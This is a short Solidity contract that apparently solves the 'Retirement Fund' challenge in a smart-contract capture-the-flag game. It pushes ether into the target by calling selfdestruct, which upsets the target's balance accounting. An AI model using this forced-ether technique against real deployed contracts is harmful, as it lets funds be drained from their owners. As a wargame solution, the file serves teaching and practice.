pragma solidity ^0.4.21;

contract RetirementFundChallengeSolver {
    function solveChallenge(address challenge) public {
        selfdestruct(challenge);
    }

    function() public payable {}
}
